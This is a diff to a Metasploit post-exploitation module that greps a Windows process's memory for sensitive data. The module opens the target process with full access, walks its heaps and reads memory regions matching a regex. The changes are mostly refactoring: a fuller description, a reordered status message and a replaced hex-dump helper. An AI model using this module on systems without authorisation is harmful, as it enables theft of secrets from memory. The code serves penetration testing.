@@ -13,8 +13,10 @@ class Metasploit3 < Msf::Post
 		super( update_info(info,
 			'Name'           => 'Windows Gather Process Memory Grep',
 			'Description'    => %q{
-					This module allows for searching the memory space of a proccess for potentially sensitive
-				data.
+					This module allows for searching the memory space of a proccess for potentially
+				sensitive data.  Please note: This module will have to migrate to the process you
+				are grepping, and will not migrate back automatically.  This means that if the user
+				terminates the application after using this module, you may lose your session.
 			},
 			'License'        => MSF_LICENSE,
 			'Author'         => ['bannedit'],
@@ -40,12 +42,12 @@ class Metasploit3 < Msf::Post
 		regex = Regexp.new(datastore['REGEX'])
 		target_pid = client.sys.process[name]
 
-		print_status("Found #{datastore['PROCESS']} running as pid: #{target_pid}")
-
 		if not target_pid
 			print_error("Could not access the target process")
 			return
 		end
+
+		print_status("Found #{datastore['PROCESS']} running as pid: #{target_pid}")
 
 		process = session.sys.process.open(target_pid, PROCESS_ALL_ACCESS)
 		begin
@@ -95,7 +97,6 @@ class Metasploit3 < Msf::Post
 			handles.each do |handle|
 				lpentry = "\x00" * 42
 				while (ret = railgun.kernel32.HeapWalk(handle, lpentry)) and ret['return']
-					#print ret.inspect
 					entry = ret['lpEntry'][0, 4].unpack('V')[0]
 					size = ret['lpEntry'][4, 4].unpack('V')[0]
 					data = process.memory.read(entry, size)
@@ -113,7 +114,10 @@ class Metasploit3 < Msf::Post
 			idx = mem['Data'].index(regex)
 
 			if idx != nil
-				print_status("Match found...\n" + hex_dump(mem['Data'][idx, 512], mem['Address']+idx))
+				print_status("Match found!")
+				print_line
+				data = mem['Data'][idx, 512], mem['Address']+idx
+				print_line(Rex::Text.to_hex_dump(data[0]))
 			end
 		end
 
@@ -121,43 +125,11 @@ class Metasploit3 < Msf::Post
 			idx = mem['Data'].index(regex)
 
 			if idx != nil
-				print_status("Match found...\n" + hex_dump(mem['Data'][idx, 512], mem['Address']+idx))
+				print_status("Match found")
+				print_line
+				data = mem['Data'][idx, 512], mem['Address']+idx
+				print_line(Rex::Text.to_hex_dump(data[0]))
 			end
 		end
-	end
-
-	def hex_dump(str, base = 0, width = 16)
-		buf = ''
-		idx = 0
-		cnt = 0
-		snl = false
-		lst = 0
-
-		while (idx < str.length)
-
-			chunk = str[idx, width]
-			addr = "0x%08x:\t" % (base + idx)
-			line  = chunk.unpack("H*")[0].scan(/../).join(" ")
-			buf << addr + line # add the index to the beginning of the line (base + idx)
-
-			if (lst == 0)
-				lst = line.length
-				buf << " " * 4
-			else
-				buf << " " * ((lst - line.length) + 4).abs
-			end
-
-			chunk.unpack("C*").each do |c|
-				if (c >	0x1f and c < 0x7f)
-					buf << c.chr
-				else
-					buf << "."
-				end
-			end
-
-			buf << "\n"
-			idx += width
-		end
-		buf << "\n"
 	end
 end
